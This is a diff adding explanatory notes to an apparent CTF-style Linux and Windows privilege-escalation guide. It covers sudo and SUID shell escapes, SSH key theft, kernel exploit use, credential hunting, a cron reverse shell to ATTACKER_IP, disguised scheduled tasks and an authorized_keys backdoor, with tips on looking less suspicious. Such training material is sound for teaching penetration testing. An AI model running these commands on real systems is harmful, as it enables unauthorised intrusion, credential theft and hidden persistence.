@@ -175,6 +175,7 @@ $ sudo -l
 
 # FOUND IT! Move to Phase 2
 ```
+> `id` shows current user/group; `sudo -l` lists allowed sudo commands without needing a password. Always run both immediately after getting a shell — `sudo -l` is the #1 fastest privesc check.
 
 ### Phase 2: Quick Win Exploitation (2-10 minutes)
 
@@ -192,6 +193,7 @@ $ sudo find / -exec /bin/sh \; -quit
 root@target:~# id
 uid=0(root)  # SUCCESS!
 ```
+> `sudo find / -exec /bin/sh \; -quit` runs `find` as root and uses its `-exec` flag to spawn a root shell. The `\;` terminates the -exec command; `-quit` exits after the first match so it's instant.
 
 ### Phase 3: If Quick Wins Failed (20-60 minutes)
 
@@ -212,6 +214,7 @@ $ ./linpeas.sh > output.txt
 # Test locally
 # Execute on target
 ```
+> Redirect output to a file so you can review it at your own pace. Focus on PEASS's color-coded highlights — red/yellow items are highest priority. Transfer linpeas.sh to the target via your HTTP server first.
 
 ### Phase 4: Verify Success
 
@@ -225,6 +228,7 @@ root
 root@target:~# hostname
 target
 ```
+> Run these three to confirm root access. `id` shows `uid=0(root)` for confirmed root; `whoami` is a quick sanity check; `hostname` confirms you're still on the right box after shell stabilization.
 
 ---
 
@@ -417,6 +421,7 @@ User user1 may run the following commands without password:
 
 # FOUND IT! Can run /bin/bash as user2 without password!
 ```
+> `sudo -l` lists all sudo privileges for the current user. The `(user2) NOPASSWD:` line means you can run that binary as user2 with no password — immediate lateral movement.
 
 **Key Finding:**
 ```
@@ -441,6 +446,7 @@ uid=1001(user2) gid=1001(user2) groups=1001(user2)
 
 # Successfully escalated to user2!
 ```
+> `-u user2` specifies the target user; `/bin/bash` is the command to run as that user. Replace `user2` and `/bin/bash` with whatever the `sudo -l` output shows as allowed.
 
 ---
 
@@ -485,6 +491,7 @@ HTB{pr1v1lege_esc4l4t10n_p4rt_1}
 
 # FLAG 1 CAPTURED!
 ```
+> `$(</path/to/file)` is bash's built-in file-read syntax — works when `cat` is unavailable. Replace the path with any file you need to read; this is a key GTFOBins bash file-read technique.
 
 **Key Learning:**
 ```
@@ -529,6 +536,7 @@ total 8
 
 # SSH keys found! And readable!
 ```
+> `2>/dev/null` discards error messages — if the directory is inaccessible you get silence instead of "Permission denied". If you see file listings, those files are world-readable and you can steal them.
 
 **Key Learning:**
 ```
@@ -594,6 +602,7 @@ $ ls -la root_key
 -rw------- 1 user user 1679 Jan 25 15:30 root_key
 # Now SSH will accept this key
 ```
+> SSH refuses to use keys that are too permissive (it will say "Permissions too open" and exit). `chmod 600` sets owner read/write only — always do this before attempting to use a stolen key.
 
 **Step 4: SSH as root Using Private Key**
 
@@ -604,6 +613,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 # ROOT ACCESS ACHIEVED!
 ```
+> `-i` specifies the private key file; `-p` sets the SSH port (default 22). Replace `root_key`, `root`, and `TARGET_IP` with your actual filename, target username, and IP.
 
 ---
 
@@ -1134,6 +1144,7 @@ When scripts won't work:
 ```bash
 ./linpeas.sh
 ```
+> Runs the full LinPEAS enumeration suite. Transfer to the target first via HTTP server; save output to a file (`./linpeas.sh | tee linpeas_out.txt`) so you can review it offline with color intact.
 
 ### What Happens
 
@@ -1429,6 +1440,7 @@ Kernel exploits = Direct path to root
    $ cat /etc/os-release
    Ubuntu 16.04 LTS
    ```
+   > `uname -r` gives the kernel version string to search for CVEs; `/etc/os-release` shows the distro and release for exploit compatibility checking.
 
 2. **Search for Known Exploits**
    ```bash
@@ -1442,6 +1454,7 @@ Kernel exploits = Direct path to root
    https://cve.mitre.org
    https://nvd.nist.gov
    ```
+   > `searchsploit 3.10.0 linux` searches the local Exploit-DB for matching kernel exploits. Add `privilege escalation` to narrow results; use `linux-exploit-suggester` on the target for automated kernel CVE matching.
 
 3. **Find CVE Number**
    ```
@@ -1455,6 +1468,7 @@ Kernel exploits = Direct path to root
    # Compile if needed (usually C code)
    $ gcc exploit.c -o exploit
    ```
+   > Compiles a C exploit to an executable named `exploit`. Some exploits need extra flags (e.g., `-pthread` for DirtyCow); read the exploit source comments for the correct compile command.
 
 5. **Run on Target**
    ```bash
@@ -1583,6 +1597,7 @@ Stability issues = admin investigation
 $ uname -a
 Linux target 3.10.0-514.el7.x86_64
 ```
+> `uname -a` gives the full kernel version string. Use the first three version numbers (e.g., `3.10.0`) when searching for exploits — the patch level affects applicability.
 
 **Step 2: Search for Vulnerabilities**
 ```bash
@@ -1590,6 +1605,7 @@ $ searchsploit 3.10.0
 # Or
 $ google "3.10.0 linux kernel exploit"
 ```
+> Start with searchsploit for offline speed, then fall back to Google. Also run `linux-exploit-suggester` directly on the target — it cross-references uname output against a CVE database automatically.
 
 **Step 3: Assess Applicability**
 ```
@@ -1606,6 +1622,7 @@ $ searchsploit -m linux/local/40844.c
 # Or from GitHub/Exploit-DB
 $ wget https://raw.githubusercontent.com/.../exploit.c
 ```
+> `searchsploit -m` copies the exploit to your current directory. Read the source before compiling — it may have hardcoded paths or require specific compilation flags listed in the comments.
 
 **Step 5: Compile (if needed)**
 ```bash
@@ -1615,6 +1632,7 @@ $ python3 exploit.py
 # Or
 $ ./exploit.sh (already compiled)
 ```
+> `-pthread` is needed for exploits that use threads (e.g., DirtyCow). If gcc isn't on the target, compile on your attacker machine with the same architecture and transfer the binary.
 
 **Step 6: Execute with Caution**
 ```bash
@@ -1669,18 +1687,21 @@ ii  openssh-server    1:7.4p1-10
 ii  apache2           2.4.41-1
 ii  mysql-server      8.0.23-0
 ```
+> Lists all installed Debian/Ubuntu packages with version numbers. Output is large — pipe through `less` or redirect to a file and grep for interesting software.
 
 **Better formatting:**
 ```bash
 $ dpkg -l | grep -i mysql
 ii  mysql-server      8.0.23-0
 ```
+> `-i` makes the grep case-insensitive. Replace `mysql` with any software name to check its installed version for CVE research.
 
 **Find specific version:**
 ```bash
 $ dpkg -l | grep apache
 ii  apache2           2.4.41-1
 ```
+> Filters the package list to show only Apache entries. The second column is the version — take that to searchsploit or exploit-db.com for known vulnerabilities.
 
 ---
 
@@ -1694,11 +1715,15 @@ C:\> dir "C:\Program Files (x86)"
 # Or use PowerShell
 PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
 ```
+> `dir "C:\Program Files"` lists installed 64-bit apps; `(x86)` covers 32-bit. The PowerShell registry query returns structured objects including `DisplayName` and `DisplayVersion` — pipe to `Select DisplayName,DisplayVersion` for clean output.
 
 **See all installed software with versions:**
 ```cmd
 C:\> wmic product list brief
 ```
+> Lists all MSI-installed software with name, version, and vendor. Not all software uses MSI (some use portable installs), so also check Program Files manually. Takes a few seconds to run.
+
+**Step 3: Search for Vulnerabilities**
 
 ---
 
@@ -1725,6 +1750,7 @@ $ searchsploit apache 2.4.10
 # "apache 2.4.10 exploit"
 # "Apache 2.4.10 CVE"
 ```
+> Replace `apache 2.4.10` with the exact software and version you found. Results are filtered from the offline Exploit-DB — results show exploit type (local/remote/DoS) and path. Use `searchsploit -m <path>` to copy the exploit file to your current directory.
 
 **Check for Path Traversal:**
 ```bash
@@ -1752,6 +1778,7 @@ $ searchsploit mysql 5.7.20
 
 $ searchsploit "mysql 5.7" privilege escalation
 ```
+> The second form uses quotes to search for the exact phrase and adds `privilege escalation` to filter noise. Use both — one finds version-specific results, the other narrows to PrivEsc-relevant exploits only.
 
 **Common MySQL PrivEsc Vectors:**
 
@@ -1822,11 +1849,13 @@ Linux:
 $ dpkg -l
 # Note all software and versions
 ```
+> Lists all installed packages with version numbers. Output is long — pipe to `less` or redirect to a file. Focus on server software (apache2, mysql-server, php, etc.) and note their exact version strings for CVE searching.
 
 Windows:
 ```cmd
 C:\> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
 ```
+> Queries the registry for all installed 64-bit programs. For 32-bit apps add `Wow6432Node\` to the path. Pipe to `Select DisplayName, DisplayVersion | Sort DisplayName` for a clean, sorted list.
 
 **Step 2: Note Interesting Software**
 
@@ -1845,6 +1874,7 @@ $ for app in apache2 mysql php; do
     searchsploit "$app" | head -5
   done
 ```
+> Loops through multiple app names and runs searchsploit for each — good for a quick triage pass. Replace the app names with whatever you found via `dpkg -l`. `head -5` limits output so it doesn't flood the terminal.
 
 **Step 4: Assess Exploitability**
 
@@ -1870,6 +1900,7 @@ $ cat exploit.c
 # Compile if needed
 $ gcc -o exploit exploit.c
 ```
+> `searchsploit -m` mirrors the exploit file to the current directory. Always `cat` it before running — check for hardcoded paths, required args, and the exact compilation command usually listed in the header comments.
 
 **Step 6: Execute and Verify**
 
@@ -1881,6 +1912,7 @@ $ ./exploit
 $ id
 # Should show elevated privileges
 ```
+> Run `./exploit` and watch for any output indicating success or failure. Immediately follow with `id` — if `uid=0(root)` appears, you have root. If the exploit crashes or errors, read the output and check whether you compiled with the right flags.
 
 ---
 
@@ -2014,6 +2046,7 @@ Controlled via /etc/sudoers file
 ```bash
 sudo -l
 ```
+> Lists all sudo privileges for the current user. No password needed to run the check itself (even on password-protected sudo). The single most important command to run immediately after gaining a shell.
 
 **Example Output (Password Required):**
 ```bash
@@ -2133,6 +2166,7 @@ root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 # SUCCESS!
 ```
+> Classic GTFOBins sudo escape. `find` runs as root, `-exec /bin/sh` spawns a shell inheriting root's privileges, `-quit` exits after the first match. Replace `/bin/sh` with `/bin/bash` for a better shell.
 
 **Explanation:**
 ```
@@ -2157,6 +2191,7 @@ root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 # SUCCESS!
 ```
+> `sudo less` opens the pager as root. Inside less, typing `!<command>` executes a shell command — so `!/bin/sh` drops you into a root shell. Works identically with `man`, `more`, `vi`, and any other pager-style tool.
 
 **Explanation:**
 ```
@@ -2180,6 +2215,7 @@ root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 # SUCCESS!
 ```
+> `sudo vim` opens vim as root. In vim's command mode, `:!/bin/sh` runs a shell command — the `!` in ex-command mode spawns the command as a subprocess, which inherits vim's root privileges. You get a root shell; type `exit` to return to vim.
 
 ---
 
@@ -2281,6 +2317,7 @@ find / -perm -2000 2>/dev/null
 # Find both
 find / -perm /4000 -o -perm /2000 2>/dev/null
 ```
+> `-perm -4000` matches files with the SUID bit set (runs as file owner); `-perm /4000 -o -perm /2000` finds both SUID and SGID. Pipe to `ls -la` for ownership details; cross-reference with GTFOBins for exploitable binaries.
 
 **Example Output:**
 ```
@@ -2318,6 +2355,7 @@ Because it runs as root
 ```bash
 find / -perm -4000 2>/dev/null
 ```
+> `-perm -4000` matches files with the SUID bit set. Pipe to `ls -la` for ownership details or just review the paths — anything under `/usr/local/bin/`, `/opt/`, or home directories is likely custom and worth investigating.
 
 **Step 2: Identify Non-Standard Binaries**
 ```
@@ -2344,6 +2382,7 @@ strings /usr/local/bin/custom_app
 # Try command injection
 /usr/local/bin/custom_app "; /bin/sh"
 ```
+> `strings` extracts readable ASCII from a binary — look for system calls, file paths, and hardcoded commands that hint at what the app does. Replace `custom_app` with the SUID binary you found.
 
 **Step 4: Exploit**
 ```bash
@@ -2351,6 +2390,7 @@ strings /usr/local/bin/custom_app
 /usr/local/bin/custom_app "; /bin/sh"
 # Runs as root → root shell!
 ```
+> If the binary passes user input to a shell command without sanitizing it, appending `; /bin/sh` terminates the original command and spawns a root shell. The exact injection syntax varies — also try `$(whoami)`, backticks, and `| /bin/sh`.
 
 ---
 
@@ -2403,6 +2443,7 @@ echo "* * * * * root /tmp/shell.sh" >> /etc/cron.d/my_cron
 # Step 4: Wait for cron to run (usually within 1 minute)
 # Step 5: Receive reverse shell as root
 ```
+> `* * * * *` runs every minute. Replace ATTACKER_IP/PORT with your tun0 IP and nc listener port. Make shell.sh executable (`chmod +x`) and ensure your nc listener is running before cron fires.
 
 ---
 
@@ -2434,6 +2475,7 @@ echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /usr/local/bin/backup.sh
 # Step 4: Wait for scheduled time
 # Step 5: Receive reverse shell as root
 ```
+> `>>` appends your payload without replacing the script's original content (less suspicious). Note the cron schedule — `0 * * * *` runs at the top of every hour, so you may wait up to 60 minutes.
 
 ---
 
@@ -2458,6 +2500,7 @@ Get-ScheduledTask -TaskName "BackupTask"
 # View task history
 Get-ScheduledTask -TaskName "BackupTask" | Get-ScheduledTaskInfo
 ```
+> `Get-ScheduledTask` lists all tasks — look for ones running as `SYSTEM` or `Administrator`. `-TaskName` filters to a specific task; pipe to `Get-ScheduledTaskInfo` to see last run time and status.
 
 ---
 
@@ -2473,6 +2516,7 @@ Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Updates"
 
 # Task runs when someone logs in → Reverse shell
 ```
+> Creates a task named "Updates" (blend in with legitimate tasks) that fires at logon. Replace `C:\reverse_shell.exe` with your payload path. Make sure your nc listener is running before the next logon event.
 
 **If You Can Modify Existing Task:**
 
@@ -2483,6 +2527,7 @@ Set-ScheduledTask -TaskName "Backup" `
 
 # Next time task runs → Your code executes
 ```
+> Replaces the action of an existing legitimate task with your payload — requires write permissions on the task. Replace `"Backup"` with the task name from `Get-ScheduledTask` and `C:\evil.exe` with your payload path.
 
 ---
 
@@ -2570,6 +2615,7 @@ root
 $ id
 uid=0(root) gid=0(root)
 ```
+> `grep password` searches the config file for lines containing "password" — try also `grep -i pass`, `grep -i secret`, `grep -i key` for variations. `su - root` prompts for root's password; the `-` loads root's full environment. Try every found password against root and any other usernames you've discovered.
 
 ---
 
@@ -2585,6 +2631,7 @@ cat /root/.bash_history  # If readable
 # - ssh root@...
 # - Commands with credentials
 ```
+> History files often contain plaintext passwords typed in previous commands. `/root/.bash_history` is frequently world-readable on misconfigured systems — always check.
 
 **PowerShell History (Windows):**
 ```powershell
@@ -2594,6 +2641,7 @@ Get-History
 
 # Look for passwords, API keys, credentials
 ```
+> The full path is typically `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. `Get-History` only shows the current session; the file persists across sessions and often contains credentials passed as arguments.
 
 ---
 
@@ -2624,6 +2672,7 @@ cat /root/.ssh/id_rsa
 # Check if readable
 ls -la /root/.ssh/
 ```
+> Replace `user` with actual usernames found in `/etc/passwd`. Try `cat /root/.ssh/id_rsa` — on misconfigured boxes it's world-readable. `ls -la /root/.ssh/` shows permissions without needing to read the key content; if you see a file listing, the files inside may be readable even if the dir perms look restricted.
 
 ---
 
@@ -2647,6 +2696,7 @@ ssh -i id_rsa root@TARGET_IP
 root@target:~# id
 uid=0(root) gid=0(root)
 ```
+> Copy the entire key output from `-----BEGIN RSA PRIVATE KEY-----` to `-----END RSA PRIVATE KEY-----` inclusive. `chmod 600` is mandatory — SSH refuses keys with permissions that allow other users to read them. Replace `root` with the target username and `TARGET_IP` with the box IP.
 
 ---
 
@@ -2714,6 +2764,7 @@ $ ls -la key*
 $ cat key.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
 ```
+> `-f key` saves the key pair to `key` (private) and `key.pub` (public) in the current directory. Press Enter for an empty passphrase so you can use the key non-interactively.
 
 ---
 
@@ -2731,6 +2782,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
 chmod 600 /root/.ssh/authorized_keys
 chmod 700 /root/.ssh/
 ```
+> Appends your public key to root's authorized_keys — use `>>` not `>` to avoid overwriting existing keys. The permissions on authorized_keys and .ssh must be restrictive or SSH will ignore the file.
 
 ---
 
@@ -2750,6 +2802,7 @@ uid=0(root) gid=0(root) groups=0(root)
 # Step 4: Persistent access - you can reconnect anytime
 # Even if other shells die, SSH key still works
 ```
+> `-i key` points SSH to your generated private key. Once the public key is in authorized_keys, this login works every time — even if the original shell you used to install the key dies. Replace `root` and `TARGET_IP` with the target user and box IP.
 
 ---
 
